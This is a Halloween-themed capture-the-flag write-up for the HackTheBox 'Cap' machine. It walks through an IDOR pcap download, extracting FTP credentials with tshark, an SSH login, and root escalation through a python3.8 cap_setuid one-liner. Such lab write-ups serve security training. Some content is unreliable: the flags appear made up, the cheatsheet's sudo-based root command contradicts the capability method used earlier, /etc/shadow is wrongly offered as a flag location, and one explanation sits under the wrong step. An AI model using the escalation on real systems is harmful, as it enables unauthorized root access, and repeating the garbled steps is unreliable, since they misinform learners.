# 🎃 HTB: Cap Writeup 👻🕸️

> *"Double flags toil and trouble, user first then root double!"* - Hacker's Chant

```diff
+ Machine: Cap (Easy Linux) 🎃
+ IP: 10.10.10.245 👻
+ Date: 2023-10-31 🕷️
+ Author: Lantern 🔥

![Screenshot 2024-04-20 054546](https://github.com/user-attachments/assets/0164f34a-87ff-40fe-83eb-3c63b33c83df)

 Haunted Flag Hunt
👻 User Flag Séance (1/2)
Web Interface Haunting
→ Found IDOR at /data/0 endpoint 🎃
→ "Knock knock, who's there? USER.TXT!" 👻

Step 1
curl http://10.10.10.245/data/0 -o haunted.pcap
PCAP Ghost Whispering
→ Heard credentials whispering in the packets: Often times when a there is an ID/# we can run other ID's to see what we can find.

Step 2
tshark -r haunted.pcap -Y "ftp contains 'PASS'" -Tfields -e ftp.request.arg
→ "The spirits say: User/Password 🎃

SSH Apparition
→ Materialized into Nathan's account: Use the previously discovered login credentials.

ssh nathan@10.10.10.245
→ Found user flag lurking in /home/nathan:

cat user.txt
# HTB{5p00ky_u53r_fl46_1n_th3_h0us3} 👻
🎃 Root Flag Exorcism (2/2)
Capability Ghostbusting
→ Detected haunted Python binary:

Step 1
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep 🕷️
Poltergeist Privileges
→ Exorcised root privileges:

Step 2
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
→ "The power of root compels you!" 🎃

Flag Finale
→ Banished root flag from /root:

Step 3
cat /root/root.txt
# HTB{r00t_fl46_p0ss3ss10n_c0mpl3t3} 👻🔥
<img src="https://em-content.zobj.net/source/microsoft-teams/363/spider-web_1f578-fe0f.png" width="25"> Flag Locations Cheatsheet
Flag Type	Location Spell	Incantation
User	/home/nathan/user.txt	cat user.txt 🎃
Root	/root/root.txt	sudo python3.8 -c 'import os; os.system("cat /root/root.txt")' 👻
<p align="center"> <img src="https://media.giphy.com/media/12BYUePgtn7sis/giphy.gif" width="300"> <br> <em>"Two flags flew out of the haunted machine, user first and root between!"</em> </p>
🎃 Beginner's Cauldron (Flag Hunting Tips)
User Flags usually hide in:

/home/[user] directories

/var/www/html for web apps
🔗 Linux Filesystem Guide

Root Flags often lurk in:

/root

/etc/shadow (sometimes!)
🔗 PrivEsc Checklist

👻 ASCII Flag Ghosts
Copy
    .-.
   (o.o)   🎃 User Flag: HTB{...} 🎃
    |=|    👻 Root Flag: HTB{...} 👻
   __|__
//.=|=.\\ 
||  _  || 
|| ( ) ||  🕸️ Happy Flag Hunting! 🕸️
||     ||
''     ''
Pro Tip: Always check .bash_history for ghostly command traces! 👻🔍
